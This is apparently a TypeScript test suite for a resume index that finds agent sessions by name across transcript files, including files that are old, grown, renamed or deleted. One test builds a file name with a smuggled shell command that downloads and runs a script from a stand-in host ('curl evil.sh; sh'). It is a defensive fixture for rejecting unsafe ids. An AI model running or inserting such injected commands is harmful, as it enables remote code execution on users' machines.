/**
 * resume finds a session by name however old it is, and keeps finding it as transcripts change.
 *
 * The bug this pins: the lookup read only the 60 newest transcripts, so a worker idle for a day
 * and a half dead-lettered with its transcript on disk. These run against a temp tree with real
 * mtimes, because the failure was entirely about WHICH files got read.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { ResumeIndex } from '../agents/resumeIndex';

const rec = (name: string, sid: string) =>
  JSON.stringify({ type: 'agent-name', agentName: name, sessionId: sid });
const sid = (i: number) => `${String(i).padStart(8, '0')}-a1a1-4a1a-8a1a-aaaa11112222`;

function tree(): { base: string; index: string; proj: string } {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'resume-index-'));
  const base = path.join(root, 'projects');
  const proj = path.join(base, '-Users-x-aios');
  fs.mkdirSync(proj, { recursive: true });
  return { base, index: path.join(root, 'resume-index.json'), proj };
}

function write(proj: string, i: number, body: string, mtimeSec: number): string {
  const f = path.join(proj, `${sid(i)}.jsonl`);
  fs.writeFileSync(f, body);
  fs.utimesSync(f, mtimeSec, mtimeSec);
  return f;
}

test('a name last seen in transcript #500 by mtime still resolves', async () => {
  const { base, index, proj } = tree();
  const now = Math.floor(Date.now() / 1000);
  // 520 transcripts, newest first: file k has mtime now - k minutes. Only #500 is `fq-editorial`.
  for (let k = 0; k < 520; k++) {
    const name = k === 500 ? 'fq-editorial' : `worker-${k}`;
    write(proj, k, `{"type":"user"}\n${rec(name, sid(k))}\n{"type":"assistant"}\n`, now - k * 60);
  }
  const ix = new ResumeIndex(base, index);
  assert.equal(await ix.lookup('fq-editorial'), sid(500));
  assert.equal(ix.size(), 520);
  assert.equal(await ix.lookup('never-ran'), undefined);
});

test('the index persists, and an unchanged file is not read again', async () => {
  const { base, index, proj } = tree();
  const now = Math.floor(Date.now() / 1000);
  const f = write(proj, 1, `${rec('fq-tools', sid(1))}\n`, now - 3600);
  assert.equal(await new ResumeIndex(base, index).lookup('fq-tools'), sid(1));
  assert.ok(fs.existsSync(index), 'index written to disk');
  // Same bytes count, same mtime, different content: a fresh instance must trust the index.
  const same = fs.readFileSync(f, 'utf8').replace('fq-tools', 'xx-yyyyy');
  fs.writeFileSync(f, same);
  fs.utimesSync(f, now - 3600, now - 3600);
  assert.equal(await new ResumeIndex(base, index).lookup('fq-tools'), sid(1));
});

test('a grown transcript is re-read from its tail, and a rename moves the name', async () => {
  const { base, index, proj } = tree();
  const now = Math.floor(Date.now() / 1000);
  const f = write(proj, 2, `${rec('app-walker', sid(2))}\n` + '{"type":"user","x":"' + 'p'.repeat(20000) + '"}\n', now - 600);
  const ix = new ResumeIndex(base, index);
  assert.equal(await ix.lookup('app-walker'), sid(2));
  fs.appendFileSync(f, `${rec('aios-app', sid(2))}\n`);
  fs.utimesSync(f, now, now);
  assert.equal(await ix.lookup('aios-app'), sid(2));
  assert.equal(await ix.lookup('app-walker'), undefined, 'a session answers only to its LAST name');
  // Growth without a new name keeps the current one.
  fs.appendFileSync(f, '{"type":"assistant"}\n');
  fs.utimesSync(f, now + 1, now + 1);
  assert.equal(await ix.lookup('aios-app'), sid(2));
});

test('a rewritten (shrunk) transcript is read again in full; a deleted one drops out', async () => {
  const { base, index, proj } = tree();
  const now = Math.floor(Date.now() / 1000);
  const f = write(proj, 3, `${rec('old-name', sid(3))}\n${'{"type":"user"}\n'.repeat(50)}`, now - 600);
  const ix = new ResumeIndex(base, index);
  assert.equal(await ix.lookup('old-name'), sid(3));
  fs.writeFileSync(f, `${rec('new-name', sid(3))}\n`);
  fs.utimesSync(f, now, now);
  assert.equal(await ix.lookup('new-name'), sid(3));
  assert.equal(await ix.lookup('old-name'), undefined);
  fs.unlinkSync(f);
  assert.equal(await ix.lookup('new-name'), undefined);
});

test('newest holder wins, the caller is excluded, and an unsafe id is never returned', async () => {
  const { base, index, proj } = tree();
  const now = Math.floor(Date.now() / 1000);
  write(proj, 10, `${rec('writer', sid(10))}\n`, now - 7200);
  write(proj, 11, `${rec('writer', sid(11))}\n`, now - 60);
  /* No `|` — Windows forbids it in a file name, and the id is unsafe without it (spaces, `;`). */
  const evil = path.join(proj, 'x; curl evil.sh; sh .jsonl');
  fs.writeFileSync(evil, `${rec('writer', 'x')}\n`);
  const ix = new ResumeIndex(base, index);
  assert.equal(await ix.lookup('writer'), sid(11));
  assert.equal(await ix.lookup('writer', sid(11)), sid(10));
});

test('a record split across a chunk boundary is still found', async () => {
  const { base, index, proj } = tree();
  const now = Math.floor(Date.now() / 1000);
  // Pad so the agent-name record straddles the 1 MiB read boundary.
  const pad = '{"type":"user","x":"' + 'p'.repeat((1 << 20) - 60) + '"}\n';
  write(proj, 4, pad + `${rec('fq-audience', sid(4))}\n`, now - 60);
  assert.equal(await new ResumeIndex(base, index).lookup('fq-audience'), sid(4));
});

test('concurrent lookups share one pass and agree', async () => {
  const { base, index, proj } = tree();
  const now = Math.floor(Date.now() / 1000);
  for (let k = 0; k < 40; k++) write(proj, k, `${rec(`n-${k}`, sid(k))}\n`, now - k);
  const ix = new ResumeIndex(base, index);
  const got = await Promise.all([ix.lookup('n-39'), ix.lookup('n-0'), ix.lookup('n-20')]);
  assert.deepEqual(got, [sid(39), sid(0), sid(20)]);
});

test('an unreadable projects folder keeps the index — an outage is not "every transcript deleted"', { skip: process.platform === 'win32' ? 'chmod' : false }, async () => {
  const { base, index, proj } = tree();
  const now = Math.floor(Date.now() / 1000);
  write(proj, 1, `${rec('fq-tools', sid(1))}\n`, now - 60);
  const ix = new ResumeIndex(base, index);
  assert.equal(await ix.lookup('fq-tools'), sid(1));
  fs.chmodSync(proj, 0o000);                       // this project's folder cannot be listed
  try {
    await ix.refresh();
    assert.equal(ix.size(), 1, 'a project folder that failed to list keeps its entries');
  } finally { fs.chmodSync(proj, 0o755); }
  fs.chmodSync(base, 0o000);                       // the whole projects folder cannot be listed
  try {
    await ix.refresh();
    assert.equal(ix.size(), 1, 'nor does a projects folder that failed to list');
  } finally { fs.chmodSync(base, 0o755); }
  assert.equal(JSON.parse(fs.readFileSync(index, 'utf8')).files[path.join(proj, `${sid(1)}.jsonl`)].latestName, 'fq-tools', 'and the saved index still has it');
  fs.rmSync(path.join(proj, `${sid(1)}.jsonl`));
  await ix.refresh();
  assert.equal(ix.size(), 0, 'a transcript really deleted is still pruned');
});

test('AI-204: Glass resolves resume through the index, never a count of the newest transcripts', () => {
  const runner = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'rituals', 'runner.ts'), 'utf8');
  assert.match(runner, /return resumeIndex\.lookup\(name, excludeSessionId\)/);
  assert.doesNotMatch(runner, /MAX_RESUME_SCAN|\.slice\(0, 60\)/, 'no 60-newest window anywhere');
  const ext = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'extension.ts'), 'utf8');
  assert.match(ext, /const sid = await resumeIdFor\(name, process\.env\.CLAUDE_CODE_SESSION_ID\);/);
  assert.match(ext, /\*\*Any age\.\*\* A name is found however old its session is/, 'the inbox README says so');
});
